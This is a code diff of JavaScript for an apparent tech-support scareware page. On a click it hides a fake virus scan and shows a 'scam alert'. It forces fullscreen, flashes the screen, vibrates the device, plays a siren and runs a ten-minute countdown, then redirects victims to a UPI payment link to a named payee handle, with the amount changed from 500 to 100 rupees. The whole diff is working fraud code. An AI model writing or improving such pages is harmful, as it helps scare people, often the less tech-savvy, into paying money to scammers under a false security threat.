@@ -8,23 +8,41 @@ window.onload = function () {
 
   console.log("✅ warningImage found, click listener ready");
 
-  const triggerAlert = () => {
-    console.log("🛑 scam triggered");
-    document.getElementById('warningScreen').classList.add('hidden');
-    document.getElementById('scamAlert').classList.remove('hidden');
-    document.body.classList.add('flashing');
+  warningImage.addEventListener('click', function() {
+    showScamAlert();
+    enterFullscreen();
+  });
 
-    if ('vibrate' in navigator) navigator.vibrate([500, 200, 500]);
 
-    const siren = document.getElementById('siren');
-    if (siren) siren.play().catch(() => {});
+function enterFullscreen() {
+  if (!document.fullscreenElement) {
+    document.documentElement.requestFullscreen().catch(() => {});
+  }
+}
 
-    startCountdown();
-  };
+function showScamAlert() {
+  document.getElementById('virusScan').classList.add('hidden');
+  document.getElementById('warningScreen').classList.add('hidden');
+  document.getElementById('scamAlert').classList.remove('hidden');
 
-  image.addEventListener('click', triggerAlert);
-  image.addEventListener('touchstart', triggerAlert);
-};
+  
+  // Start effects
+  document.body.classList.add('flashing');
+  if ('vibrate' in navigator) navigator.vibrate([500, 200, 500]);
+
+  
+  // Play siren sound
+  const siren = document.getElementById('siren');
+  if (siren) {
+    siren.play().catch(() => {});
+  }
+
+  siren.play().catch(e => console.log("Audio blocked:", e));
+  
+  // Start countdown
+  startCountdown();
+}
+
 
 function startCountdown() {
   let time = 600;
@@ -45,7 +63,7 @@ function startCountdown() {
 function Payment(app) {
   if ("vibrate" in navigator) navigator.vibrate(200);
 
-  const baseUPI = "upi://pay?pa=mann06@fam&pn=Payment&am=500&cu=INR";
+  const baseUPI = "upi://pay?pa=mann06@fam&pn=Payment&am=100&cu=INR";
   let upiURL = baseUPI;
 
   if (app === "PayTM") {
@@ -56,9 +74,14 @@ function Payment(app) {
     upiURL += "&mc=0000&mode=05&orgid=000000";
   }
 
-  // Redirect to UPI link
   window.location.href = upiURL;
 }
+
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'F11' || e.key === 'Escape') {
+    document.exitFullscreen();More actions
+  }
+});
 
 document.addEventListener('keydown', (e) => {
   if (e.key === 'F11' || e.key === 'Escape') {
